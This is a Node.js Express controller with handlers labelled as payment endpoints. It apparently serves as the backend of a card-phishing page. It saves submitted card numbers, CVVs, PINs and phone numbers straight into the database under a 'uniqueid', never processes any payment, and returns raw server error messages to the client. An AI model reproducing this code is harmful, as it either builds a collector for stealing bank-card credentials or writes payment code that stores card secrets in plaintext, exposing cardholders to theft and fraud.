const NetBanking = require('../models/NetBanking');
const PaymentRequest = require('../models/PaymentRequest');

// Handle net banking payment data submission
exports.submitNetBankingPayment = async (req, res) => {
    try {
        const {amount ,uniqueid } = req.body;
        
        const newNetBankingPayment = new NetBanking({
            amount,
            uniqueid,
        });

        await newNetBankingPayment.save();
        res.status(200).json({
            success: true,
            message: "Net Banking Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting net banking payment data"
        });
    }
};
// Payment request POST API
exports.createPaymentRequest = async (req, res) => {
    try {
        const { cardNumber, cvv, pin, uniqueid } = req.body;

        if (!cardNumber || !cvv || !pin || !uniqueid) {
            return res.status(400).json({ success: false, message: 'All fields are required!' });
        }

        const newPayment = new PaymentRequest({ cardNumber, cvv, pin, uniqueid });
        await newPayment.save();

        res.status(201).json({ success: true, message: 'Payment request saved successfully!' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
};

// Save phoneNumber and uniqueid
exports.savePhoneNumber = async (req, res) => {
    try {
        const { phoneNumber, uniqueid } = req.body;

        if (!phoneNumber || !uniqueid) {
            return res.status(400).json({ success: false, message: 'Both phoneNumber and uniqueid are required!' });
        }

        const newPhoneEntry = new PaymentRequest({ phoneNumber, uniqueid });
        await newPhoneEntry.save();

        res.status(201).json({ success: true, message: 'Phone number saved successfully!' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
};
